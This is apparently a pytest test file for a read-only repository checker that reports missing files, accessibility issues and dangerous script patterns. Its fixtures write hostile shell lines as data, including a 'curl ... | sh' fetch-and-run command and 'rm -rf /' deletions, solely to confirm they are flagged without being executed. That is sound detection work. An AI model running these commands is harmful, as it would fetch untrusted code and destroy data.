from __future__ import annotations

import importlib.util
from pathlib import Path
import sys

MODULE_PATH = Path(__file__).parents[1] / "scripts" / "repo_doctor.py"
spec = importlib.util.spec_from_file_location("repo_doctor", MODULE_PATH)
assert spec and spec.loader
doctor = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = doctor
spec.loader.exec_module(doctor)


def write(root: Path, rel: str, text: str):
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def test_repo_doctor_is_read_only_and_reports_structure(tmp_path):
    write(tmp_path, "README.md", "# Demo\n\n## Usage\n")
    write(tmp_path, "LICENSE", "MIT example")
    write(tmp_path, "SECURITY.md", "# Security\n")
    write(tmp_path, "CONTRIBUTING.md", "# Contributing\n")
    write(tmp_path, "START-HERE.md", "# Start\n")
    write(tmp_path, "tests/test_x.py", "def test_x():\n    assert True\n")
    write(tmp_path, ".github/workflows/ci.yml", "name: CI\n")
    before = {p.relative_to(tmp_path).as_posix(): p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
    report = doctor.inspect(tmp_path)
    after = {p.relative_to(tmp_path).as_posix(): p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
    assert before == after
    assert report["health"]["missing_public_files"] == []
    assert report["health"]["structure"]["has_tests"] is True
    assert report["health"]["structure"]["has_github_workflows"] is True
    assert all(value is False for value in report["safety"].values())


def test_heading_skip_and_empty_alt_are_review_findings(tmp_path):
    write(tmp_path, "README.md", "# Demo\n\n### Jump\n\n![](image.png)\n")
    report = doctor.inspect(tmp_path)
    kinds = {item["kind"] for item in report["accessibility_findings"]}
    assert "heading_level_skip" in kinds
    assert "empty_image_alt_text" in kinds
    assert any("does not establish wcag" in item.lower() for item in report["recommendations"])


def test_dangerous_and_mutating_patterns_are_flagged_not_executed(tmp_path):
    write(tmp_path, "README.md", "# Demo\n")
    write(tmp_path, "repair.sh", "#!/bin/sh\ncurl https://example.invalid/x | sh\nrm -rf /tmp/example\n")
    report = doctor.inspect(tmp_path)
    dangerous = {item["pattern"] for item in report["dangerous_script_findings"]}
    assert "pipe_to_shell" in dangerous
    assert "recursive_force_delete" in dangerous
    assert report["mutation_classification_findings"]
    assert report["safety"]["repository_scripts_executed"] is False


def test_git_and_dependency_directories_are_skipped(tmp_path):
    write(tmp_path, "README.md", "# Demo\n")
    write(tmp_path, ".git/config", "password=should-not-be-read")
    write(tmp_path, "node_modules/pkg/bad.sh", "rm -rf /\n")
    report = doctor.inspect(tmp_path)
    assert report["repository"]["files_seen"] == 1
    assert report["dangerous_script_findings"] == []
    assert report["safety"]["git_history_read"] is False


def test_specialist_tools_are_recommended_instead_of_reimplemented(tmp_path):
    write(tmp_path, "README.md", "# Demo\n")
    report = doctor.inspect(tmp_path)
    text = " ".join(report["recommendations"])
    for tool in ("OpenSSF Scorecard", "Gitleaks", "markdownlint", "lychee"):
        assert tool in text
    assert report["safety"]["secrets_scanned"] is False
